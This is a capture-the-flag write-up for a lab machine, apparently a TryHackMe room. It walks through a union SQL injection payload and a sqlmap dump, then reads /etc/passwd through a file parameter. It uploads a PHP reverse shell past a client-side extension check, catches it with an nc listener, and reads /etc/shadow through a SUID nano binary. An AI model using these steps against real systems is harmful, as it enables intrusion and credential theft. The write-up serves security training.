[{"content":"First of all I am going to start with an nmap scan:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 nmap -sC -sV -p- 10.10.229.207 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-28 07:58 EST Nmap scan report for 10.10.229.207 Host is up (0.055s latency). Not shown: 65530 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.11.65.91 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 9c:ef:fe:df:c3:55:d8:25:47:76:64:01:dc:93:53:50 (RSA) | 256 c9:45:fb:a7:e9:ae:2c:48:46:8f:86:82:64:a0:20:d0 (ECDSA) |_ 256 9b:25:8f:19:62:39:c6:05:ef:e5:f6:02:3f:c0:12:30 (ED25519) 53/tcp open domain ISC BIND 9.16.1 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.16.1-Ubuntu 1337/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: EXPOSED |_http-server-header: Apache/2.4.41 (Ubuntu) 1883/tcp open mosquitto version 1.6.9 | mqtt-subscribe: | Topics and their most recent payloads: | $SYS/broker/load/bytes/received/5min: 13.55 | $SYS/broker/publish/bytes/sent: 63 | $SYS/broker/load/sockets/5min: 0.57 | $SYS/broker/clients/inactive: 0 | $SYS/broker/load/messages/sent/1min: 13.71 | $SYS/broker/retained messages/count: 35 | $SYS/broker/load/bytes/sent/1min: 406.59 | $SYS/broker/load/sockets/15min: 0.20 | $SYS/broker/clients/disconnected: 0 | $SYS/broker/messages/received: 3 | $SYS/broker/store/messages/bytes: 149 | $SYS/broker/bytes/sent: 445 | $SYS/broker/load/messages/received/1min: 2.74 | $SYS/broker/load/bytes/received/15min: 4.57 | $SYS/broker/bytes/received: 69 | $SYS/broker/heap/maximum: 51456 | $SYS/broker/load/messages/sent/15min: 0.99 | $SYS/broker/load/publish/sent/1min: 10.96 | $SYS/broker/load/connections/5min: 0.39 | $SYS/broker/publish/messages/sent: 12 | $SYS/broker/load/messages/received/5min: 0.59 | $SYS/broker/clients/maximum: 1 | $SYS/broker/clients/connected: 1 | $SYS/broker/messages/sent: 15 | $SYS/broker/load/connections/15min: 0.13 | $SYS/broker/uptime: 132 seconds | $SYS/broker/messages/stored: 32 | $SYS/broker/load/publish/sent/15min: 0.80 | $SYS/broker/clients/active: 1 | $SYS/broker/clients/total: 1 | $SYS/broker/load/publish/sent/5min: 2.36 | $SYS/broker/subscriptions/count: 2 | $SYS/broker/store/messages/count: 32 | $SYS/broker/version: mosquitto version 1.6.9 | $SYS/broker/load/messages/sent/5min: 2.95 | $SYS/broker/load/bytes/sent/15min: 29.49 | $SYS/broker/load/messages/received/15min: 0.20 | $SYS/broker/load/connections/1min: 1.83 | $SYS/broker/load/sockets/1min: 2.43 | $SYS/broker/load/bytes/received/1min: 63.04 | $SYS/broker/heap/current: 51056 |_ $SYS/broker/load/bytes/sent/5min: 87.39 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 56.47 seconds We already got some important information:\nFTP server on port 21 with anonymous login allowed, There is a dns server, A web page on port 1337, And mosquitto is running on port 1883. The web page just shows the name of the room.\nWe can start a fuzzer for subdirectory enumeration:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 ffuf -u \u0026#39;http://10.10.229.207:1337/FUZZ\u0026#39; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.229.207:1337/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ admin [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 58ms] javascript [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 59ms] phpmyadmin [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 58ms] Admin seems like a fake page, I tried to type some emails and password and I don’t receive any response, so the real one must be phpmyadmin.\nAfter I tried using default credentials, I tried going back to the enumeration part and using a bigger wordlist, and I actually found another directory:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 ffuf -u \u0026#39;http://10.10.229.207:1337/FUZZ\u0026#39; -w /usr/share/wordlists/dirb/big.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.229.207:1337/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ .htpasswd [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 2901ms] .htaccess [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 3911ms] admin [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 58ms] admin_101 [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 56ms] javascript [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 55ms] phpmyadmin [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 54ms] server-status [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 57ms] :: Progress: [20469/20469] :: Job [1/1] :: 704 req/sec :: Duration: [0:00:33] :: Errors: 0 :: And we got something valueable:\nFirst of all now we know that the domain is root.thm,\nwe can change that by editing the /etc/hosts file:\n1 2 3 127.0.0.1 localhost 127.0.1.1 kali 10.10.229.207 root.thm And we can now navigate with the dns name:\nThat’s good because now we can start fuzzing the subdomains.\nAfter trying for some time, I ended up with nothing, so I am going to try brute forcing the login panel instead.\nThis also didn’t seem to go anywhere, so maybe I could try with sql injection.\nI tried to put a comment: — -\nAnd I got an error message:\nAfter trying to do something manually,\nand I managed to enter into the application using an union sql\n1 hacker\u0026#39; union select null,null,null,null# I don’t really care about the application, but I could use this union sql to gain some credentials.\nAfter trying for a while, I didn’t manage to reflect the output of the message so that was useless.\nI eventually switched to sqlmap:\nFirst of all I captured the request in a file using BURP\nand then I used sqlmap to dump the database:\n1 sqlmap -r req.txt -dump id email created password 1 hacker@root.thm 2023-02-21 09:05:46 And I found his password.\nI also found two more interesting things:\nid url password 1 /file1010111/index.php () 3 /upload-cv00101011/index.php // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z We can navigate to the first url and put the password found with the sqlmap scan:\nThe site just says:\n1 Parameter Fuzzing is also important :) or Can you hide DOM elements? Apparently the parameter in question is “?file”\nSo maybe we can use that to read files in the system:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false zeamkish:x:1001:1001:Zeam Kish,1,1,:/home/zeamkish:/bin/bash ftp:x:114:121:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin bind:x:115:122::/var/cache/bind:/usr/sbin/nologin Debian-snmp:x:116:123::/var/lib/snmp:/bin/false redis:x:117:124::/var/lib/redis:/usr/sbin/nologin mosquitto:x:118:125::/var/lib/mosquitto:/usr/sbin/nologin fwupd-refresh:x:119:126:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin And it worked, so now we have the password for the second page:\nwhich is the user zeamkish.\nNow we can upload a file:\nAnd after uploading a file we can go to the source code to see where it is stored:\n1 \u0026lt;h1\u0026gt;File uploaded successfully! Maybe look in source code to see the path\u0026lt;span style=\u0026#34; display: none;\u0026#34;\u0026gt;in /upload_thm_1001 folder\u0026lt;/span\u0026gt; \u0026lt;h1\u0026gt; And it was in fact in the http://10.10.229.207:1337/upload-cv00101011/upload_thm_1001/ folder.\nNow I took the pentestermonkey php reverse shell, and tried to upload it, but it doesn’t do anything, this is because of this function:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function validate(){ var fileInput = document.getElementById(\u0026#39;file\u0026#39;); var file = fileInput.files[0]; if (file) { var fileName = file.name; var fileExtension = fileName.split(\u0026#39;.\u0026#39;).pop().toLowerCase(); if (fileExtension === \u0026#39;jpg\u0026#39; || fileExtension === \u0026#39;png\u0026#39;) { // Valid file extension, proceed with file upload // You can submit the form or perform further processing here console.log(\u0026#39;File uploaded successfully\u0026#39;); return true; } else { // Invalid file extension, display an error message or take appropriate action console.log(\u0026#39;Only JPG and PNG files are allowed\u0026#39;); return false; } But now we know that it’s a client restriction, so it’s easy to bypass:\nWe can just rename the shell rev.png, upload it and intercept the request:\nand then we just change the name to rev.php again\nAnd we can see that it worked:\nBefore opening the file I started a listener using nc\nAnd we are now in the machine with the www-data account:\n1 2 3 4 5 6 7 8 9 10 nc -lvnp 4444 listening on [any] 4444 ... connect to [10.11.65.91] from (UNKNOWN) [10.10.229.207] 56016 Linux ip-10-10-229-207 5.15.0-1039-aws #44~20.04.1-Ubuntu SMP Thu Jun 22 12:21:12 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux 14:43:16 up 1:46, 0 users, load average: 0.01, 0.01, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) bash: cannot set terminal process group (782): Inappropriate ioctl for device bash: no job control in this shell www-data@ip-10-10-229-207:/$ We also have python so I am going to upgrade my shell:\n1 python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; And after entering the zeamkish folder I noticed that he has the credentials for the ssh in plaintext:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ls -la total 36 drwxr-xr-x 3 zeamkish zeamkish 4096 Jul 6 2023 . drwxr-xr-x 4 root root 4096 Jun 30 2023 .. -rw-rw-r-- 1 zeamkish zeamkish 5 Jul 6 2023 .bash_history -rw-r--r-- 1 zeamkish zeamkish 220 Jun 8 2023 .bash_logout -rw-r--r-- 1 zeamkish zeamkish 3771 Jun 8 2023 .bashrc drwx------ 2 zeamkish zeamkish 4096 Jun 8 2023 .cache -rw-r--r-- 1 zeamkish zeamkish 807 Jun 8 2023 .profile -rw-r----- 1 zeamkish zeamkish 27 Jun 8 2023 flag.txt -rw-rw-r-- 1 root zeamkish 34 Jun 11 2023 ssh_creds.txt $ cat ssh_creds.txt cat ssh_creds.txt SSH CREDS zeamkish \u0026lt;redacted\u0026gt; So now we are in as zeamkish and we can read the flag:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 ssh zeamkish@10.10.229.207 zeamkish@10.10.229.207\u0026#39;s password: Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-1039-aws x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun Jan 28 14:48:35 UTC 2024 System load: 0.0 Processes: 130 Usage of /: 7.5% of 58.09GB Users logged in: 0 Memory usage: 21% IPv4 address for eth0: 10.10.229.207 Swap usage: 0% * Ubuntu Pro delivers the most comprehensive open source security and compliance features. https://ubuntu.com/aws/pro Expanded Security Maintenance for Applications is not enabled. 0 updates can be applied immediately. Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Sun Jul 2 17:27:46 2023 from 10.10.83.109 zeamkish@ip-10-10-229-207:~$ whoami zeamkish zeamkish@ip-10-10-229-207:~$ ls flag.txt ssh_creds.txt zeamkish@ip-10-10-229-207:~$ cat flag.txt THM{\u0026lt;redacted\u0026gt;} After some enumeration I found a SUID set:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 zeamkish@ip-10-10-229-207:/home/ubuntu/sqlmap$ find / -type f -perm -04000 -ls 2\u0026gt;/dev/null 847 84 -rwsr-xr-x 1 root root 85064 Nov 29 2022 /snap/core20/1974/usr/bin/chfn 853 52 -rwsr-xr-x 1 root root 53040 Nov 29 2022 /snap/core20/1974/usr/bin/chsh 922 87 -rwsr-xr-x 1 root root 88464 Nov 29 2022 /snap/core20/1974/usr/bin/gpasswd 1006 55 -rwsr-xr-x 1 root root 55528 May 30 2023 /snap/core20/1974/usr/bin/mount 1015 44 -rwsr-xr-x 1 root root 44784 Nov 29 2022 /snap/core20/1974/usr/bin/newgrp 1030 67 -rwsr-xr-x 1 root root 68208 Nov 29 2022 /snap/core20/1974/usr/bin/passwd 1140 67 -rwsr-xr-x 1 root root 67816 May 30 2023 /snap/core20/1974/usr/bin/su 1141 163 -rwsr-xr-x 1 root root 166056 Apr 4 2023 /snap/core20/1974/usr/bin/sudo 1199 39 -rwsr-xr-x 1 root root 39144 May 30 2023 /snap/core20/1974/usr/bin/umount 1288 51 -rwsr-xr-- 1 root systemd-resolve 51344 Oct 25 2022 /snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper 1660 463 -rwsr-xr-x 1 root root 473576 Apr 3 2023 /snap/core20/1974/usr/lib/openssh/ssh-keysign 847 84 -rwsr-xr-x 1 root root 85064 Nov 29 2022 /snap/core20/1950/usr/bin/chfn 853 52 -rwsr-xr-x 1 root root 53040 Nov 29 2022 /snap/core20/1950/usr/bin/chsh 922 87 -rwsr-xr-x 1 root root 88464 Nov 29 2022 /snap/core20/1950/usr/bin/gpasswd 1006 55 -rwsr-xr-x 1 root root 55528 May 30 2023 /snap/core20/1950/usr/bin/mount 1015 44 -rwsr-xr-x 1 root root 44784 Nov 29 2022 /snap/core20/1950/usr/bin/newgrp 1030 67 -rwsr-xr-x 1 root root 68208 Nov 29 2022 /snap/core20/1950/usr/bin/passwd 1140 67 -rwsr-xr-x 1 root root 67816 May 30 2023 /snap/core20/1950/usr/bin/su 1141 163 -rwsr-xr-x 1 root root 166056 Apr 4 2023 /snap/core20/1950/usr/bin/sudo 1199 39 -rwsr-xr-x 1 root root 39144 May 30 2023 /snap/core20/1950/usr/bin/umount 1288 51 -rwsr-xr-- 1 root systemd-resolve 51344 Oct 25 2022 /snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper 1660 463 -rwsr-xr-x 1 root root 473576 Apr 3 2023 /snap/core20/1950/usr/lib/openssh/ssh-keysign 66 40 -rwsr-xr-x 1 root root 40152 Jun 14 2022 /snap/core/15511/bin/mount 80 44 -rwsr-xr-x 1 root root 44168 May 7 2014 /snap/core/15511/bin/ping 81 44 -rwsr-xr-x 1 root root 44680 May 7 2014 /snap/core/15511/bin/ping6 98 40 -rwsr-xr-x 1 root root 40128 Nov 29 2022 /snap/core/15511/bin/su 116 27 -rwsr-xr-x 1 root root 27608 Jun 14 2022 /snap/core/15511/bin/umount 2646 71 -rwsr-xr-x 1 root root 71824 Nov 29 2022 /snap/core/15511/usr/bin/chfn 2648 40 -rwsr-xr-x 1 root root 40432 Nov 29 2022 /snap/core/15511/usr/bin/chsh 2725 74 -rwsr-xr-x 1 root root 75304 Nov 29 2022 /snap/core/15511/usr/bin/gpasswd 2817 39 -rwsr-xr-x 1 root root 39904 Nov 29 2022 /snap/core/15511/usr/bin/newgrp 2830 53 -rwsr-xr-x 1 root root 54256 Nov 29 2022 /snap/core/15511/usr/bin/passwd 2940 134 -rwsr-xr-x 1 root root 136808 Jan 17 2023 /snap/core/15511/usr/bin/sudo 3039 42 -rwsr-xr-- 1 root systemd-resolve 42992 Oct 26 2022 /snap/core/15511/usr/lib/dbus-1.0/dbus-daemon-launch-helper 3411 419 -rwsr-xr-x 1 root root 428240 Oct 7 2022 /snap/core/15511/usr/lib/openssh/ssh-keysign 6485 125 -rwsr-xr-x 1 root root 127656 May 27 2023 /snap/core/15511/usr/lib/snapd/snap-confine 7673 386 -rwsr-xr-- 1 root dip 394984 Jul 23 2020 /snap/core/15511/usr/sbin/pppd 66 40 -rwsr-xr-x 1 root root 40152 Jun 14 2022 /snap/core/15419/bin/mount 80 44 -rwsr-xr-x 1 root root 44168 May 7 2014 /snap/core/15419/bin/ping 81 44 -rwsr-xr-x 1 root root 44680 May 7 2014 /snap/core/15419/bin/ping6 98 40 -rwsr-xr-x 1 root root 40128 Nov 29 2022 /snap/core/15419/bin/su 116 27 -rwsr-xr-x 1 root root 27608 Jun 14 2022 /snap/core/15419/bin/umount 2607 71 -rwsr-xr-x 1 root root 71824 Nov 29 2022 /snap/core/15419/usr/bin/chfn 2609 40 -rwsr-xr-x 1 root root 40432 Nov 29 2022 /snap/core/15419/usr/bin/chsh 2686 74 -rwsr-xr-x 1 root root 75304 Nov 29 2022 /snap/core/15419/usr/bin/gpasswd 2778 39 -rwsr-xr-x 1 root root 39904 Nov 29 2022 /snap/core/15419/usr/bin/newgrp 2791 53 -rwsr-xr-x 1 root root 54256 Nov 29 2022 /snap/core/15419/usr/bin/passwd 2901 134 -rwsr-xr-x 1 root root 136808 Jan 17 2023 /snap/core/15419/usr/bin/sudo 3000 42 -rwsr-xr-- 1 root systemd-resolve 42992 Oct 26 2022 /snap/core/15419/usr/lib/dbus-1.0/dbus-daemon-launch-helper 3372 419 -rwsr-xr-x 1 root root 428240 Oct 7 2022 /snap/core/15419/usr/lib/openssh/ssh-keysign 6446 125 -rwsr-xr-x 1 root root 127656 May 12 2023 /snap/core/15419/usr/lib/snapd/snap-confine 7634 386 -rwsr-xr-- 1 root dip 394984 Jul 23 2020 /snap/core/15419/usr/sbin/pppd 56 43 -rwsr-xr-x 1 root root 43088 Sep 16 2020 /snap/core18/2785/bin/mount 65 63 -rwsr-xr-x 1 root root 64424 Jun 28 2019 /snap/core18/2785/bin/ping 81 44 -rwsr-xr-x 1 root root 44664 Nov 29 2022 /snap/core18/2785/bin/su 99 27 -rwsr-xr-x 1 root root 26696 Sep 16 2020 /snap/core18/2785/bin/umount 1754 75 -rwsr-xr-x 1 root root 76496 Nov 29 2022 /snap/core18/2785/usr/bin/chfn 1756 44 -rwsr-xr-x 1 root root 44528 Nov 29 2022 /snap/core18/2785/usr/bin/chsh 1809 75 -rwsr-xr-x 1 root root 75824 Nov 29 2022 /snap/core18/2785/usr/bin/gpasswd 1873 40 -rwsr-xr-x 1 root root 40344 Nov 29 2022 /snap/core18/2785/usr/bin/newgrp 1886 59 -rwsr-xr-x 1 root root 59640 Nov 29 2022 /snap/core18/2785/usr/bin/passwd 1977 146 -rwsr-xr-x 1 root root 149080 Apr 4 2023 /snap/core18/2785/usr/bin/sudo 2065 42 -rwsr-xr-- 1 root systemd-resolve 42992 Oct 25 2022 /snap/core18/2785/usr/lib/dbus-1.0/dbus-daemon-launch-helper 2375 427 -rwsr-xr-x 1 root root 436552 Mar 30 2022 /snap/core18/2785/usr/lib/openssh/ssh-keysign 56 43 -rwsr-xr-x 1 root root 43088 Sep 16 2020 /snap/core18/2751/bin/mount 65 63 -rwsr-xr-x 1 root root 64424 Jun 28 2019 /snap/core18/2751/bin/ping 81 44 -rwsr-xr-x 1 root root 44664 Nov 29 2022 /snap/core18/2751/bin/su 99 27 -rwsr-xr-x 1 root root 26696 Sep 16 2020 /snap/core18/2751/bin/umount 1728 75 -rwsr-xr-x 1 root root 76496 Nov 29 2022 /snap/core18/2751/usr/bin/chfn 1730 44 -rwsr-xr-x 1 root root 44528 Nov 29 2022 /snap/core18/2751/usr/bin/chsh 1783 75 -rwsr-xr-x 1 root root 75824 Nov 29 2022 /snap/core18/2751/usr/bin/gpasswd 1847 40 -rwsr-xr-x 1 root root 40344 Nov 29 2022 /snap/core18/2751/usr/bin/newgrp 1860 59 -rwsr-xr-x 1 root root 59640 Nov 29 2022 /snap/core18/2751/usr/bin/passwd 1951 146 -rwsr-xr-x 1 root root 149080 Apr 4 2023 /snap/core18/2751/usr/bin/sudo 2039 42 -rwsr-xr-- 1 root systemd-resolve 42992 Oct 25 2022 /snap/core18/2751/usr/lib/dbus-1.0/dbus-daemon-launch-helper 2349 427 -rwsr-xr-x 1 root root 436552 Mar 30 2022 /snap/core18/2751/usr/lib/openssh/ssh-keysign 10732 52 -rwsr-xr-- 1 root messagebus 51344 Oct 25 2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper 25779 464 -rwsr-xr-x 1 root root 473576 Apr 3 2023 /usr/lib/openssh/ssh-keysign 13935 24 -rwsr-xr-x 1 root root 22840 Feb 21 2022 /usr/lib/policykit-1/polkit-agent-helper-1 7479 16 -rwsr-xr-x 1 root root 14488 Jul 8 2019 /usr/lib/eject/dmcrypt-get-device 7044 144 -rwsr-xr-x 1 root root 146888 May 29 2023 /usr/lib/snapd/snap-confine 9161 84 -rwsr-xr-x 1 root root 85064 Nov 29 2022 /usr/bin/chfn 13933 32 -rwsr-xr-x 1 root root 31032 Feb 21 2022 /usr/bin/pkexec 16077 164 -rwsr-xr-x 1 root root 166056 Apr 4 2023 /usr/bin/sudo 5576 40 -rwsr-xr-x 1 root root 39144 May 30 2023 /usr/bin/umount 9166 68 -rwsr-xr-x 1 root root 68208 Nov 29 2022 /usr/bin/passwd 9165 88 -rwsr-xr-x 1 root root 88464 Nov 29 2022 /usr/bin/gpasswd 3189 44 -rwsr-xr-x 1 root root 44784 Nov 29 2022 /usr/bin/newgrp 9163 52 -rwsr-xr-x 1 root root 53040 Nov 29 2022 /usr/bin/chsh 2136 316 -rwsr-xr-x 1 root root 320136 Apr 10 2020 /usr/bin/nano 10845 68 -rwsr-xr-x 1 root root 67816 May 30 2023 /usr/bin/su 2028 40 -rwsr-xr-x 1 root root 39144 Mar 7 2020 /usr/bin/fusermount 1571 316 -rwsr-x--- 1 root zeamkish 320160 Feb 18 2020 /usr/bin/find 2166 56 -rwsr-sr-x 1 daemon daemon 55560 Nov 12 2018 /usr/bin/at 5210 56 -rwsr-xr-x 1 root root 55528 May 30 2023 /usr/bin/mount We can see that we can run nano with root privileges.\nI tried to gain a root shell but failed, so I just went and read the file of the shadow and password:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 /usr/bin/nano /etc/shadow root:\u0026lt;redacted\u0026gt;:19519:0:99999:7::: daemon:*:18561:0:99999:7::: bin:*:18561:0:99999:7::: sys:*:18561:0:99999:7::: sync:*:18561:0:99999:7::: games:*:18561:0:99999:7::: man:*:18561:0:99999:7::: lp:*:18561:0:99999:7::: mail:*:18561:0:99999:7::: news:*:18561:0:99999:7::: uucp:*:18561:0:99999:7::: proxy:*:18561:0:99999:7::: www-data:*:18561:0:99999:7::: backup:*:18561:0:99999:7::: list:*:18561:0:99999:7::: irc:*:18561:0:99999:7::: gnats:*:18561:0:99999:7::: nobody:*:18561:0:99999:7::: systemd-network:*:18561:0:99999:7::: systemd-resolve:*:18561:0:99999:7::: systemd-timesync:*:18561:0:99999:7::: messagebus:*:18561:0:99999:7::: syslog:*:18561:0:99999:7::: _apt:*:18561:0:99999:7::: tss:*:18561:0:99999:7::: uuidd:*:18561:0:99999:7::: tcpdump:*:18561:0:99999:7::: sshd:*:18561:0:99999:7::: landscape:*:18561:0:99999:7::: pollinate:*:18561:0:99999:7::: ec2-instance-connect:!:18561:0:99999:7::: systemd-coredump:!!:19502:::::: ubuntu:\u0026lt;redacted\u0026gt;:19519:0:99999:7::: lxd:!:19502:::::: mysql:!:19502:0:99999:7::: zeamkish:\u0026lt;redacted\u0026gt;:19516:0:99999:7::: ftp:*:19519:0:99999:7::: bind:*:19523:0:99999:7::: Debian-snmp:!:19523:0:99999:7::: redis:*:19523:0:99999:7::: mosquitto:*:19523:0:99999:7::: fwupd-refresh:*:19544:0:99999:7::: /usr/bin/nano /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin 